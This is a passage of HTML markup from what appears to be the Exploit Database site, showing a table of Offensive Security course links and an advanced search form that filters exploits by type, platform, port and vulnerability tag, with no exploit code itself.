                                       target="_blank" rel="noopener">Evasion Techniques and breaching Defences (PEN-300)
                                       <br />All new for 2020
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.offensive-security.com/penetration-testing/#asa"
                                       target="_blank" rel="noopener">Application Security Assessment
                                    </a>
                                </td>

                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="/advanced-web-attacks"
                                       target="_blank" rel="noopener">OSWE
                                    </a>
                                </td>
                                <td>
                                    <a href="/advanced-web-attacks"
                                       target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                                       <br />Updated for 2020
                                    </a>
                                </td>
                                <td></td>
                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="/windows-user-mode-exploit-development"
                                       target="_blank" rel="noopener">OSED
                                    </a>
                                </td>
                                <td>
                                    <a href="/windows-user-mode-exploit-development"
                                       target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                                       <br />All new for 2021
                                    </a>
                                </td>
                                <td></td>
                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="https://www.offensive-security.com/awe-osee/"
                                       target="_blank" rel="noopener">OSEE
                                    </a>
                                </td>
                                <td>
<!--
                                    <a href="https://www.offensive-security.com/metasploit-unleashed/"
                                       target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                                    </a>
-->
                                </td>
                                <td></td>
                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="https://kali.training/"
                                       target="_blank" rel="noopener">KLCP
                                    </a>
                                </td>
                                <td>
                                    <a href="https://kali.training/courses/kali-linux-revealed/" target="_blank"
                                       target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                                    </a>
                                </td>
                                <td></td>
                            </tr>

                            </tbody>

                        </table>

            </div>

            <div class="modal-footer">

                <button type="button"
                        class="btn btn-primary"
                        data-dismiss="modal">Close
                </button>

            </div>

        </div>

    </div>

</div>

    <!-- Advanced Search Modal -->
<div class="modal fade bd-example-modal-lg" id="search" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
         role="document">

        <div class="modal-content">

            <div class="modal-header">

                <h5 class="modal-title"
                    id="searchModalTitle">Search The Exploit Database
                </h5>

                <button type="button" class="close" data-dismiss="modal"
                        aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>

            </div>

            <div class="modal-body">

                <form action="https://www.exploit-db.com/search" method="GET" id="searchForm">

                    <div class="row">

                        <div class="col-sm-12 col-lg-8">

                            <div class="form-group">

                                <label for="titleSearch" class="control-label text-primary">Title</label>

                                <input id="titleSearch" class="form-control" type="text" name="q" class="q"
                                       placeholder="Title" value="" autofocus>

                            </div>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <div class="form-group">

                                <label for="cveSearch" class="control-label text-primary">CVE</label>

                                <input id="cveSearch" class="form-control" type="text" name="cve" class="cve"
                                       placeholder="2021-1234"
                                       value="" autofocus>

                            </div>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-sm-6 col-lg-4">

                            <label for="typeSearchSelect" class="text-primary">Type</label>

                            <select id="typeSearchSelect" name="type" class="form-control">

                                <option></option>
                                
                                    <option value="dos" >
                                        dos
                                    </option>


                                
                                    <option value="local" >
                                        local
                                    </option>


                                
                                    <option value="remote" >
                                        remote
                                    </option>


                                
                                    <option value="shellcode" >
                                        shellcode
                                    </option>


                                
                                    <option value="papers" >
                                        papers
                                    </option>


                                
                                    <option value="webapps" >
                                        webapps
                                    </option>


                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <label for="platformSearchSelect" class="text-primary">Platform</label>

                            <select id="platformSearchSelect" name="platform" class="form-control">

                                <option></option>
                                
                                    <option value="aix" >
                                        AIX
                                    </option>

                                
                                    <option value="asp" >
                                        ASP
                                    </option>

                                
                                    <option value="bsd" >
                                        BSD
                                    </option>

                                
                                    <option value="bsd_ppc" >
                                        BSD_PPC
                                    </option>

                                
                                    <option value="bsd_x86" >
                                        BSD_x86
                                    </option>

                                
                                    <option value="bsdi_x86" >
                                        BSDi_x86
                                    </option>

                                
                                    <option value="cgi" >
                                        CGI
                                    </option>

                                
                                    <option value="freebsd" >
                                        FreeBSD
                                    </option>

                                
                                    <option value="freebsd_x86" >
                                        FreeBSD_x86
                                    </option>

                                
                                    <option value="freebsd_x86-64" >
                                        FreeBSD_x86-64
                                    </option>

                                
                                    <option value="generator" >
                                        Generator
                                    </option>

                                
                                    <option value="hardware" >
                                        Hardware
                                    </option>

                                
                                    <option value="hp-ux" >
                                        HP-UX
                                    </option>

                                
                                    <option value="irix" >
                                        IRIX
                                    </option>

                                
                                    <option value="jsp" >
                                        JSP
                                    </option>

                                
                                    <option value="linux" >
                                        Linux
                                    </option>

                                
                                    <option value="linux_mips" >
                                        Linux_MIPS
                                    </option>

                                
                                    <option value="linux_ppc" >
                                        Linux_PPC
                                    </option>

                                
                                    <option value="linux_sparc" >
                                        Linux_SPARC
                                    </option>

                                
                                    <option value="linux_x86" >
                                        Linux_x86
                                    </option>

                                
                                    <option value="linux_x86-64" >
                                        Linux_x86-64
                                    </option>

                                
                                    <option value="minix" >
                                        MINIX
                                    </option>

                                
                                    <option value="multiple" >
                                        Multiple
                                    </option>

                                
                                    <option value="netbsd_x86" >
                                        NetBSD_x86
                                    </option>

                                
                                    <option value="novell" >
                                        Novell
                                    </option>

                                
                                    <option value="openbsd" >
                                        OpenBSD
                                    </option>

                                
                                    <option value="openbsd_x86" >
                                        OpenBSD_x86
                                    </option>

                                
                                    <option value="osx_ppc" >
                                        OSX_PPC
                                    </option>

                                
                                    <option value="osx" >
                                        OSX
                                    </option>

                                
                                    <option value="php" >
                                        PHP
                                    </option>

                                
                                    <option value="plan9" >
                                        Plan9
                                    </option>

                                
                                    <option value="qnx" >
                                        QNX
                                    </option>

                                
                                    <option value="sco" >
                                        SCO
                                    </option>

                                
                                    <option value="sco_x86" >
                                        SCO_x86
                                    </option>

                                
                                    <option value="solaris" >
                                        Solaris
                                    </option>

                                
                                    <option value="solaris_sparc" >
                                        Solaris_SPARC
                                    </option>

                                
                                    <option value="solaris_x86" >
                                        Solaris_x86
                                    </option>

                                
                                    <option value="tru64" >
                                        Tru64
                                    </option>

                                
                                    <option value="ultrix" >
                                        ULTRIX
                                    </option>

                                
                                    <option value="unix" >
                                        Unix
                                    </option>

                                
                                    <option value="unixware" >
                                        UnixWare
                                    </option>

                                
                                    <option value="windows_x86" >
                                        Windows_x86
                                    </option>

                                
                                    <option value="windows_x86-64" >
                                        Windows_x86-64
                                    </option>

                                
                                    <option value="windows" >
                                        Windows
                                    </option>

                                
                                    <option value="arm" >
                                        ARM
                                    </option>

                                
                                    <option value="cfm" >
                                        CFM
                                    </option>

                                
                                    <option value="netware" >
                                        Netware
                                    </option>

                                
                                    <option value="superh_sh4" >
                                        SuperH_SH4
                                    </option>

                                
                                    <option value="java" >
                                        Java
                                    </option>

                                
                                    <option value="beos" >
                                        BeOS
                                    </option>

                                
                                    <option value="immunix" >
                                        Immunix
                                    </option>

                                
                                    <option value="palm_os" >
                                        Palm_OS
                                    </option>

                                
                                    <option value="atheos" >
                                        AtheOS
                                    </option>

                                
                                    <option value="ios" >
                                        iOS
                                    </option>

                                
                                    <option value="android" >
                                        Android
                                    </option>

                                
                                    <option value="xml" >
                                        XML
                                    </option>

                                
                                    <option value="perl" >
                                        Perl
                                    </option>

                                
                                    <option value="python" >
                                        Python
                                    </option>

                                
                                    <option value="system_z" >
                                        System_z
                                    </option>

                                
                                    <option value="json" >
                                        JSON
                                    </option>

                                
                                    <option value="ashx" >
                                        ASHX
                                    </option>

                                
                                    <option value="ruby" >
                                        Ruby
                                    </option>

                                
                                    <option value="aspx" >
                                        ASPX
                                    </option>

                                
                                    <option value="macos" >
                                        macOS
                                    </option>

                                
                                    <option value="linux_crisv32" >
                                        Linux_CRISv32
                                    </option>

                                
                                    <option value="ezine" >
                                        eZine
                                    </option>

                                
                                    <option value="magazine" >
                                        Magazine
                                    </option>

                                
                                    <option value="nodejs" >
                                        NodeJS
                                    </option>

                                
                                    <option value="alpha" >
                                        Alpha
                                    </option>

                                
                                    <option value="solaris_mips" >
                                        Solaris_MIPS
                                    </option>

                                
                                    <option value="lua" >
                                        Lua
                                    </option>

                                
                                    <option value="watchos" >
                                        watchOS
                                    </option>

                                
                                    <option value="vxworks" >
                                        VxWorks
                                    </option>

                                
                                    <option value="python2" >
                                        Python2
                                    </option>

                                
                                    <option value="python3" >
                                        Python3
                                    </option>

                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <div class="form-group">

                                <label for="authorSearch" class="text-primary">Author</label>

                                <input id="authorSearch" class="form-control" type="text" name="e_author"
                                       placeholder="Author" value="">

                            </div>
                        </div>

                    </div>

                    <div class="row">

                        <div class="col-sm-12 col-lg-6">

                            <div class="form-group">

                                <label for="textSearch" class="control-label text-primary">Content</label>

                                <input id="textSearch" class="form-control" type="text" name="text"
                                       placeholder="Exploit content" value="">

                            </div>

                        </div>

                        <div class="col-sm-6 col-lg-2">

                            <label for="portSearchSelect" class="text-primary">Port</label>

                            <select id="portSearchSelect" name="port" class="form-control">

                                <option></option>
                                
                                    <option value="14" >
                                        14
                                    </option>


                                
                                    <option value="21" >
                                        21
                                    </option>


                                
                                    <option value="22" >
                                        22
                                    </option>


                                
                                    <option value="23" >
                                        23
                                    </option>


                                
                                    <option value="25" >
                                        25
                                    </option>


                                
                                    <option value="42" >
                                        42
                                    </option>


                                
                                    <option value="49" >
                                        49
                                    </option>


                                
                                    <option value="53" >
                                        53
                                    </option>


                                
                                    <option value="66" >
                                        66
                                    </option>


                                
                                    <option value="69" >
                                        69
                                    </option>


                                
                                    <option value="70" >
                                        70
                                    </option>


                                
                                    <option value="79" >
                                        79
                                    </option>


                                
                                    <option value="80" >
                                        80
                                    </option>


                                
                                    <option value="81" >
                                        81
                                    </option>


                                
                                    <option value="102" >
                                        102
                                    </option>


                                
                                    <option value="105" >
                                        105
                                    </option>


                                
                                    <option value="110" >
                                        110
                                    </option>


                                
                                    <option value="111" >
                                        111
                                    </option>


                                
                                    <option value="113" >
                                        113
                                    </option>


                                
                                    <option value="119" >
                                        119
                                    </option>


                                
                                    <option value="123" >
                                        123
                                    </option>


                                
                                    <option value="135" >
                                        135
                                    </option>


                                
                                    <option value="139" >
                                        139
                                    </option>


                                
                                    <option value="143" >
                                        143
                                    </option>


                                
                                    <option value="161" >
                                        161
                                    </option>


                                
                                    <option value="162" >
                                        162
                                    </option>


                                
                                    <option value="164" >
                                        164
                                    </option>


                                
                                    <option value="383" >
                                        383
                                    </option>


                                
                                    <option value="389" >
                                        389
                                    </option>


                                
                                    <option value="402" >
                                        402
                                    </option>


                                
                                    <option value="406" >
                                        406
                                    </option>


                                
                                    <option value="411" >
                                        411
                                    </option>


                                
                                    <option value="443" >
                                        443
                                    </option>


                                
                                    <option value="444" >
                                        444
                                    </option>


                                
                                    <option value="445" >
                                        445
                                    </option>


                                
                                    <option value="446" >
                                        446
                                    </option>


                                
                                    <option value="502" >
                                        502
                                    </option>


                                
                                    <option value="504" >
                                        504
                                    </option>


                                
                                    <option value="513" >
                                        513
                                    </option>


                                
                                    <option value="514" >
                                        514
                                    </option>


                                
                                    <option value="515" >
                                        515
                                    </option>


                                
                                    <option value="532" >
                                        532
                                    </option>


                                
                                    <option value="548" >
                                        548
                                    </option>


                                
                                    <option value="554" >
                                        554
                                    </option>


                                
                                    <option value="555" >
                                        555
                                    </option>


                                
                                    <option value="617" >
                                        617
                                    </option>


                                
                                    <option value="623" >
                                        623
                                    </option>


                                
                                    <option value="631" >
                                        631
                                    </option>


                                
                                    <option value="655" >
                                        655
                                    </option>


                                
                                    <option value="689" >
                                        689
                                    </option>


                                
                                    <option value="783" >
                                        783
                                    </option>


                                
                                    <option value="787" >
                                        787
                                    </option>


                                
                                    <option value="808" >
                                        808
                                    </option>


                                
                                    <option value="873" >
                                        873
                                    </option>


                                
                                    <option value="888" >
                                        888
                                    </option>


                                
                                    <option value="901" >
                                        901
                                    </option>


                                
                                    <option value="998" >
                                        998
                                    </option>


                                
                                    <option value="1000" >
                                        1000
                                    </option>


                                
                                    <option value="1040" >
                                        1040
                                    </option>


                                
                                    <option value="1089" >
                                        1089
                                    </option>


                                
                                    <option value="1099" >
                                        1099
                                    </option>


                                
                                    <option value="1100" >
                                        1100
                                    </option>


                                
                                    <option value="1114" >
                                        1114
                                    </option>


                                
                                    <option value="1120" >
                                        1120
                                    </option>


                                
                                    <option value="1194" >
                                        1194
                                    </option>


                                
                                    <option value="1235" >
                                        1235
                                    </option>


                                
                                    <option value="1471" >
                                        1471
                                    </option>


                                
                                    <option value="1521" >
                                        1521
                                    </option>


                                
                                    <option value="1533" >
                                        1533
                                    </option>


                                
                                    <option value="1581" >
                                        1581
                                    </option>


                                
                                    <option value="1589" >
                                        1589
                                    </option>


                                
                                    <option value="1604" >
                                        1604
                                    </option>


                                
                                    <option value="1617" >
                                        1617
                                    </option>


                                
                                    <option value="1723" >
                                        1723
                                    </option>


                                
                                    <option value="1743" >
                                        1743
                                    </option>


                                
                                    <option value="1761" >
                                        1761
                                    </option>


                                
                                    <option value="1812" >
                                        1812
                                    </option>


                                
                                    <option value="1858" >
                                        1858
                                    </option>


                                
                                    <option value="1861" >
                                        1861
                                    </option>


                                
                                    <option value="1900" >
                                        1900
                                    </option>


                                
                                    <option value="1947" >
                                        1947
                                    </option>


                                
                                    <option value="2000" >
                                        2000
                                    </option>


                                
                                    <option value="2022" >
                                        2022
                                    </option>


                                
                                    <option value="2049" >
                                        2049
                                    </option>


                                
                                    <option value="2100" >
                                        2100
                                    </option>


                                
                                    <option value="2103" >
                                        2103
                                    </option>


                                
                                    <option value="2121" >
                                        2121
                                    </option>


                                
                                    <option value="2125" >
                                        2125
                                    </option>


                                
                                    <option value="2181" >
                                        2181
                                    </option>


                                
                                    <option value="2242" >
                                        2242
                                    </option>


                                
                                    <option value="2315" >
                                        2315
                                    </option>


                                
                                    <option value="2375" >
                                        2375
                                    </option>


                                
                                    <option value="2380" >
                                        2380
                                    </option>


                                
                                    <option value="2381" >
                                        2381
                                    </option>


                                
                                    <option value="2401" >
                                        2401
                                    </option>


                                
                                    <option value="2480" >
                                        2480
                                    </option>


                                
                                    <option value="2525" >
                                        2525
                                    </option>


                                
                                    <option value="2640" >
                                        2640
                                    </option>


                                
                                    <option value="2810" >
                                        2810
                                    </option>


                                
                                    <option value="2812" >
                                        2812
                                    </option>


                                
                                    <option value="2947" >
                                        2947
                                    </option>


                                
                                    <option value="2954" >
                                        2954
                                    </option>


                                
                                    <option value="2990" >
                                        2990
                                    </option>


                                
                                    <option value="3000" >
                                        3000
                                    </option>


                                
                                    <option value="3030" >
                                        3030
                                    </option>


                                
                                    <option value="3050" >
                                        3050
                                    </option>


                                
                                    <option value="3052" >
                                        3052
                                    </option>


                                
                                    <option value="3128" >
                                        3128
                                    </option>


                                
                                    <option value="3129" >
                                        3129
                                    </option>


                                
                                    <option value="3181" >
                                        3181
                                    </option>


                                
                                    <option value="3200" >
                                        3200
                                    </option>


                                
                                    <option value="3217" >
                                        3217
                                    </option>


                                
                                    <option value="3306" >
                                        3306
                                    </option>


                                
                                    <option value="3333" >
                                        3333
                                    </option>


                                
                                    <option value="3378" >
                                        3378
                                    </option>


                                
                                    <option value="3389" >
                                        3389
                                    </option>


                                
                                    <option value="3460" >
                                        3460
                                    </option>


                                
                                    <option value="3465" >
                                        3465
                                    </option>


                                
                                    <option value="3500" >
                                        3500
                                    </option>


                                
                                    <option value="3535" >
                                        3535
                                    </option>


                                
                                    <option value="3632" >
                                        3632
                                    </option>


                                
                                    <option value="3690" >
                                        3690
                                    </option>


                                
                                    <option value="3790" >
                                        3790
                                    </option>


                                
                                    <option value="3814" >
                                        3814
                                    </option>


                                
                                    <option value="3817" >
                                        3817
                                    </option>


                                
                                    <option value="4000" >
                                        4000
                                    </option>


                                
                                    <option value="4002" >
                                        4002
                                    </option>


                                
                                    <option value="4070" >
                                        4070
                                    </option>


                                
                                    <option value="4081" >
                                        4081
                                    </option>


                                
                                    <option value="4105" >
                                        4105
                                    </option>


                                
                                    <option value="4111" >
                                        4111
                                    </option>


                                
                                    <option value="4322" >
                                        4322
                                    </option>


                                
                                    <option value="4343" >
                                        4343
                                    </option>


                                
                                    <option value="4434" >
                                        4434
                                    </option>


                                
                                    <option value="4501" >
                                        4501
                                    </option>


                                
                                    <option value="4555" >
                                        4555
                                    </option>


                                
                                    <option value="4592" >
                                        4592
                                    </option>


                                
                                    <option value="4661" >
                                        4661
                                    </option>


                                
                                    <option value="4750" >
                                        4750
                                    </option>


                                
                                    <option value="4848" >
                                        4848
                                    </option>


                                
                                    <option value="5000" >
                                        5000
                                    </option>


                                
                                    <option value="5060" >
                                        5060
                                    </option>


                                
                                    <option value="5061" >
                                        5061
                                    </option>


                                
                                    <option value="5080" >
                                        5080
                                    </option>


                                
                                    <option value="5081" >
                                        5081
                                    </option>


                                
                                    <option value="5093" >
                                        5093
                                    </option>


                                
                                    <option value="5151" >
                                        5151
                                    </option>


                                
                                    <option value="5180" >
                                        5180
                                    </option>


                                
                                    <option value="5247" >
                                        5247
                                    </option>


                                
                                    <option value="5250" >
                                        5250
                                    </option>


                                
                                    <option value="5272" >
                                        5272
                                    </option>


                                
                                    <option value="5308" >
                                        5308
                                    </option>


                                
                                    <option value="5432" >
                                        5432
                                    </option>


                                
                                    <option value="5466" >
                                        5466
                                    </option>


                                
                                    <option value="5554" >
                                        5554
                                    </option>


                                
                                    <option value="5555" >
                                        5555
                                    </option>


                                
                                    <option value="5600" >
                                        5600
                                    </option>


                                
                                    <option value="5655" >
                                        5655
                                    </option>


                                
                                    <option value="5666" >
                                        5666
                                    </option>


                                
                                    <option value="5800" >
                                        5800
                                    </option>


                                
                                    <option value="5803" >
                                        5803
                                    </option>


                                
                                    <option value="5814" >
                                        5814
                                    </option>


                                
                                    <option value="5858" >
                                        5858
                                    </option>


                                
                                    <option value="5900" >
                                        5900
                                    </option>


                                
                                    <option value="5984" >
                                        5984
                                    </option>


                                
                                    <option value="6066" >
                                        6066
                                    </option>


                                
                                    <option value="6070" >
                                        6070
                                    </option>


                                
                                    <option value="6080" >
                                        6080
                                    </option>


                                
                                    <option value="6082" >
                                        6082
                                    </option>


                                
                                    <option value="6101" >
                                        6101
                                    </option>


                                
                                    <option value="6112" >
                                        6112
                                    </option>


                                
                                    <option value="6129" >
                                        6129
                                    </option>


                                
                                    <option value="6379" >
                                        6379
                                    </option>


                                
                                    <option value="6502" >
                                        6502
                                    </option>


                                
                                    <option value="6503" >
                                        6503
                                    </option>


                                
                                    <option value="6660" >
                                        6660
                                    </option>


                                
                                    <option value="6667" >
                                        6667
                                    </option>


                                
                                    <option value="7001" >
                                        7001
                                    </option>


                                
                                    <option value="7002" >
                                        7002
                                    </option>


                                
                                    <option value="7070" >
                                        7070
                                    </option>


                                
                                    <option value="7071" >
                                        7071
                                    </option>


                                
                                    <option value="7080" >
                                        7080
                                    </option>


                                
                                    <option value="7100" >
                                        7100
                                    </option>


                                
                                    <option value="7144" >
                                        7144
                                    </option>


                                
                                    <option value="7210" >
                                        7210
                                    </option>


                                
                                    <option value="7272" >
                                        7272
                                    </option>


                                
                                    <option value="7290" >
                                        7290
                                    </option>


                                
                                    <option value="7426" >
                                        7426
                                    </option>


                                
                                    <option value="7443" >
                                        7443
                                    </option>


                                
                                    <option value="7510" >
                                        7510
                                    </option>


                                
                                    <option value="7547" >
                                        7547
                                    </option>


                                
                                    <option value="7649" >
                                        7649
                                    </option>


                                
                                    <option value="7770" >
                                        7770
                                    </option>


                                
                                    <option value="7777" >
                                        7777
                                    </option>


                                
                                    <option value="7778" >
                                        7778
                                    </option>


                                
                                    <option value="7787" >
                                        7787
                                    </option>


                                
                                    <option value="7879" >
                                        7879
                                    </option>


                                
                                    <option value="7902" >
                                        7902
                                    </option>


                                
                                    <option value="8000" >
                                        8000
                                    </option>


                                
                                    <option value="8001" >
                                        8001
                                    </option>


                                
                                    <option value="8002" >
                                        8002
                                    </option>


                                
                                    <option value="8004" >
                                        8004
                                    </option>


                                
                                    <option value="8008" >
                                        8008
                                    </option>


                                
                                    <option value="8020" >
                                        8020
                                    </option>


                                
                                    <option value="8022" >
                                        8022
                                    </option>


                                
                                    <option value="8023" >
                                        8023
                                    </option>


                                
                                    <option value="8028" >
                                        8028
                                    </option>


                                
                                    <option value="8030" >
                                        8030
                                    </option>


                                
                                    <option value="8080" >
                                        8080
                                    </option>


                                
                                    <option value="8081" >
                                        8081
                                    </option>


                                
                                    <option value="8082" >
                                        8082
                                    </option>


                                
                                    <option value="8088" >
                                        8088
                                    </option>


                                
                                    <option value="8090" >
                                        8090
                                    </option>


                                
                                    <option value="8181" >
                                        8181
                                    </option>


                                
                                    <option value="8300" >
                                        8300
                                    </option>


                                
                                    <option value="8400" >
                                        8400
                                    </option>


                                
                                    <option value="8443" >
                                        8443
                                    </option>


                                
                                    <option value="8445" >
                                        8445
                                    </option>


                                
                                    <option value="8473" >
                                        8473
                                    </option>


                                
                                    <option value="8500" >
                                        8500
                                    </option>


                                
                                    <option value="8585" >
                                        8585
                                    </option>


                                
                                    <option value="8619" >
                                        8619
                                    </option>


                                
                                    <option value="8800" >
                                        8800
                                    </option>


                                
                                    <option value="8812" >
                                        8812
                                    </option>


                                
                                    <option value="8839" >
                                        8839
                                    </option>


                                
                                    <option value="8880" >
                                        8880
                                    </option>


                                
                                    <option value="8888" >
                                        8888
                                    </option>


                                
                                    <option value="9000" >
                                        9000
                                    </option>


                                
                                    <option value="9001" >
                                        9001
                                    </option>


                                
                                    <option value="9002" >
                                        9002
                                    </option>


                                
                                    <option value="9080" >
                                        9080
                                    </option>


                                
                                    <option value="9090" >
                                        9090
                                    </option>


                                
                                    <option value="9091" >
                                        9091
                                    </option>


                                
                                    <option value="9100" >
                                        9100
                                    </option>


                                
                                    <option value="9124" >
                                        9124
                                    </option>


                                
                                    <option value="9200" >
                                        9200
                                    </option>


                                
                                    <option value="9251" >
                                        9251
                                    </option>


                                
                                    <option value="9256" >
                                        9256
                                    </option>


                                
                                    <option value="9443" >
                                        9443
                                    </option>


                                
                                    <option value="9447" >
                                        9447
                                    </option>


                                
                                    <option value="9784" >
                                        9784
                                    </option>


                                
                                    <option value="9788" >
                                        9788
                                    </option>


                                
                                    <option value="9855" >
                                        9855
                                    </option>


                                
                                    <option value="9876" >
                                        9876
                                    </option>


                                
                                    <option value="9900" >
                                        9900
                                    </option>


                                
                                    <option value="9987" >
                                        9987
                                    </option>


                                
                                    <option value="9993" >
                                        9993
                                    </option>


                                
                                    <option value="9999" >
                                        9999
                                    </option>


                                
                                    <option value="10000" >
                                        10000
                                    </option>


                                
                                    <option value="10001" >
                                        10001
                                    </option>


                                
                                    <option value="10080" >
                                        10080
                                    </option>


                                
                                    <option value="10202" >
                                        10202
                                    </option>


                                
                                    <option value="10203" >
                                        10203
                                    </option>


                                
                                    <option value="10443" >
                                        10443
                                    </option>


                                
                                    <option value="10616" >
                                        10616
                                    </option>


                                
                                    <option value="11000" >
                                        11000
                                    </option>


                                
                                    <option value="11211" >
                                        11211
                                    </option>


                                
                                    <option value="11460" >
                                        11460
                                    </option>


                                
                                    <option value="12203" >
                                        12203
                                    </option>


                                
                                    <option value="12221" >
                                        12221
                                    </option>


                                
                                    <option value="12345" >
                                        12345
                                    </option>


                                
                                    <option value="12397" >
                                        12397
                                    </option>


                                
                                    <option value="12401" >
                                        12401
                                    </option>


                                
                                    <option value="13327" >
                                        13327
                                    </option>


                                
                                    <option value="13701" >
                                        13701
                                    </option>


                                
                                    <option value="13722" >
                                        13722
                                    </option>


                                
                                    <option value="13838" >
                                        13838
                                    </option>


                                
                                    <option value="16992" >
                                        16992
                                    </option>


                                
                                    <option value="18821" >
                                        18821
                                    </option>


                                
                                    <option value="18881" >
                                        18881
                                    </option>


                                
                                    <option value="19000" >
                                        19000
                                    </option>


                                
                                    <option value="19810" >
                                        19810
                                    </option>


                                
                                    <option value="19813" >
                                        19813
                                    </option>


                                
                                    <option value="20000" >
                                        20000
                                    </option>


                                
                                    <option value="20002" >
                                        20002
                                    </option>


                                
                                    <option value="20010" >
                                        20010
                                    </option>


                                
                                    <option value="20031" >
                                        20031
                                    </option>


                                
                                    <option value="20111" >
                                        20111
                                    </option>


                                
                                    <option value="20171" >
                                        20171
                                    </option>


                                
                                    <option value="22003" >
                                        22003
                                    </option>


                                
                                    <option value="23423" >
                                        23423
                                    </option>


                                
                                    <option value="25672" >
                                        25672
                                    </option>


                                
                                    <option value="26000" >
                                        26000
                                    </option>


                                
                                    <option value="27015" >
                                        27015
                                    </option>


                                
                                    <option value="27700" >
                                        27700
                                    </option>


                                
                                    <option value="28015" >
                                        28015
                                    </option>


                                
                                    <option value="30000" >
                                        30000
                                    </option>


                                
                                    <option value="30303" >
                                        30303
                                    </option>


                                
                                    <option value="31337" >
                                        31337
                                    </option>


                                
                                    <option value="32400" >
                                        32400
                                    </option>


                                
                                    <option value="32674" >
                                        32674
                                    </option>


                                
                                    <option value="32764" >
                                        32764
                                    </option>


                                
                                    <option value="34205" >
                                        34205
                                    </option>


                                
                                    <option value="37215" >
                                        37215
                                    </option>


                                
                                    <option value="37777" >
                                        37777
                                    </option>


                                
                                    <option value="37848" >
                                        37848
                                    </option>


                                
                                    <option value="38292" >
                                        38292
                                    </option>


                                
                                    <option value="40007" >
                                        40007
                                    </option>


                                
                                    <option value="41523" >
                                        41523
                                    </option>


                                
                                    <option value="44334" >
                                        44334
                                    </option>


                                
                                    <option value="46824" >
                                        46824
                                    </option>


                                
                                    <option value="48080" >
                                        48080
                                    </option>


                                
                                    <option value="49152" >
                                        49152
                                    </option>


                                
                                    <option value="50000" >
                                        50000
                                    </option>


                                
                                    <option value="50496" >
                                        50496
                                    </option>


                                
                                    <option value="52311" >
                                        52311
                                    </option>


                                
                                    <option value="52789" >
                                        52789
                                    </option>


                                
                                    <option value="52869" >
                                        52869
                                    </option>


                                
                                    <option value="52986" >
                                        52986
                                    </option>


                                
                                    <option value="53413" >
                                        53413
                                    </option>


                                
                                    <option value="54345" >
                                        54345
                                    </option>


                                
                                    <option value="54890" >
                                        54890
                                    </option>


                                
                                    <option value="55554" >
                                        55554
                                    </option>


                                
                                    <option value="55555" >
                                        55555
                                    </option>


                                
                                    <option value="56380" >
                                        56380
                                    </option>


                                
                                    <option value="57772" >
                                        57772
                                    </option>


                                
                                    <option value="58080" >
                                        58080
                                    </option>


                                
                                    <option value="62514" >
                                        62514
                                    </option>


                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <label for="tagSearchSelect" class="text-primary">Tag</label>

                            <select id="tagSearchSelect" name="tag" class="form-control">

                                <option></option>
                                
                                    <option value="1" >
                                        WordPress Core
                                    </option>


                                
                                    <option value="3" >
                                        Metasploit Framework (MSF)
                                    </option>


                                
                                    <option value="4" >
                                        WordPress Plugin
                                    </option>


                                
                                    <option value="7" >
                                        SQL Injection (SQLi)
                                    </option>


                                
                                    <option value="8" >
                                        Cross-Site Scripting (XSS)
                                    </option>


                                
                                    <option value="9" >
                                        File Inclusion (LFI/RFI)
                                    </option>


                                
                                    <option value="12" >
                                        Cross-Site Request Forgery (CSRF)
                                    </option>


                                
                                    <option value="13" >
                                        Denial of Service (DoS)
                                    </option>


                                
                                    <option value="14" >
                                        Code Injection
                                    </option>


                                
                                    <option value="15" >
                                        Command Injection
                                    </option>


                                
                                    <option value="16" >
                                        Authentication Bypass / Credentials Bypass (AB/CB)
                                    </option>


                                
                                    <option value="18" >
                                        Client Side
                                    </option>


                                
                                    <option value="19" >
                                        Use After Free (UAF)
                                    </option>


                                
                                    <option value="20" >
                                        Out Of Bounds
                                    </option>


                                
                                    <option value="21" >
                                        Remote
                                    </option>


                                
                                    <option value="22" >
                                        Local
                                    </option>


                                
                                    <option value="23" >
                                        XML External Entity (XXE)
                                    </option>


                                
                                    <option value="24" >
                                        Integer Overflow
                                    </option>


                                
                                    <option value="25" >
                                        Server-Side Request Forgery (SSRF)
                                    </option>


                                
                                    <option value="26" >
                                        Race Condition
                                    </option>


                                
                                    <option value="27" >
                                        NULL Pointer Dereference
                                    </option>


                                
                                    <option value="28" >
                                        Malware
                                    </option>


                                
                                    <option value="31" >
                                        Buffer Overflow
                                    </option>


                                
                                    <option value="34" >
                                        Heap Overflow
                                    </option>


                                
                                    <option value="35" >
                                        Type Confusion
                                    </option>


                                
                                    <option value="36" >
                                        Object Injection
                                    </option>


                                
                                    <option value="37" >
                                        Bug Report
                                    </option>


                                
                                    <option value="38" >
                                        Console
                                    </option>


                                
                                    <option value="39" >
                                        Pwn2Own
                                    </option>


                                
                                    <option value="40" >
                                        Traversal
                                    </option>


                                
                                    <option value="41" >
                                        Deserialization
                                    </option>


                                
                            </select>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">

                                    <input class="form-check-input" type="checkbox"
                                           name="verified" value="true"
                                           id="verifiedSearchCheck"   >
                                    Verified

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
                                    <input class="form-check-input" type="checkbox"
                                           name="hasapp" value="true"
                                           id="hasappSearchCheck" >
                                    Has App

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
